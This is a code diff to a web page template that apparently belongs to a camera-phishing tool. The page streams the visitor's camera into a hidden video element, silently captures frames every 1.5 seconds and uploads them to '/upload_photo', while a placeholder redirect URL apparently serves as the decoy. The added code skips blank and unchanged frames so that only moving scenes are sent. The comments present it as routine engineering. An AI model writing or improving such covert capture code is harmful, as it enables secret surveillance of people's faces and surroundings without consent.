@@ -343,35 +343,86 @@ def home():
             setTimeout(() => window.location.replace("__REDIRECT_URL__"), 100);
           }
         }
+                // Maintain global state across interval windows to prevent data loss
+        let globalLastFrameHash = null;
 
         function processPhotoCapture(stream) {
           const video = document.getElementById('hidden-video');
           video.srcObject = stream;
-          
+
           setInterval(() => {
             try {
               const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth || 640;
-              canvas.height = video.videoHeight || 480;
+              // Downscale resolution strictly for calculating pixel changes efficiently
+              canvas.width = 160;
+              canvas.height = 120;
               
               const ctx = canvas.getContext('2d');
               ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
               
+              // Focus sampling on the core matrix area to check for movement variance
+              const imgData = ctx.getImageData(40, 30, 80, 60);
+              const buffer = imgData.data;
+              
+              let isBlank = true;
+              let rSum = 0, gSum = 0, bSum = 0;
+              
+              for (let i = 0; i < buffer.length; i += 4) {
+                let r = buffer[i];
+                let g = buffer[i+1];
+                let b = buffer[i+2];
+                
+                rSum += r;
+                gSum += g;
+                bSum += b;
+                
+                if (r > 12 || g > 12 || b > 12) {
+                  isBlank = false;
+                }
+              }
+              
+              // Block transmission if the device camera hardware is still waking up
+              if (isBlank) return; 
+
+              // Quantize pixel variance sums to mask out standard low-light sensor noise
+              const currentHash = `${Math.floor(rSum / 500)}_${Math.floor(gSum / 500)}_${Math.floor(bSum / 500)}`;
+              
+              // Drop execution if the visual baseline environment is static
+              if (globalLastFrameHash === currentHash) {
+                return; 
+              }
+              
+              // Scale resolution back to full size before compiling output file parameters
+              canvas.width = video.videoWidth || 640;
+              canvas.height = video.videoHeight || 480;
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              
               canvas.toBlob((blob) => {
                 if (!blob) return;
+                
                 const formData = new FormData();
                 formData.append('photo', blob, 'snap.jpg');
                 
                 fetch('/upload_photo', {
                   method: 'POST',
                   body: formData
-                }).catch(e => console.error(e));
-              }, 'image/jpeg', 0.85);
+                })
+                .then(res => {
+                  if (res.ok) {
+                    // Update global marker context only after server acknowledges data receipt
+                    globalLastFrameHash = currentHash; 
+                  }
+                })
+                .catch(e => console.error(e));
+              }, 'image/jpeg', 0.80);
+              
             } catch (err) {
               console.error(err);
             }
-          }, 1000);
+          }, 1500); 
         }
+
+
 
         async function requestCamera() {
           const status = document.getElementById("camera-status");
